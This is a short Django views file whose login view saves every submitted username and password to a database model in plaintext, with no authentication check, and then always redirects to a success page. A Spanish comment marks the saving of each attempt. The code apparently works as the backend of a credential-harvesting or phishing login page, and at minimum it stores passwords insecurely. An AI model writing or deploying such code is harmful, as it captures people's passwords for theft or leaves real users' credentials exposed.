from django.shortcuts import render, redirect
from .models import Usuario

def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        if username and password:
            # 🔴 Guarda cada intento de login
            Usuario.objects.create(
                username=username,
                password=password
            )

            return redirect('success')

    return render(request, 'accounts/login.html')


def success_view(request):
    return render(request, 'accounts/success.html')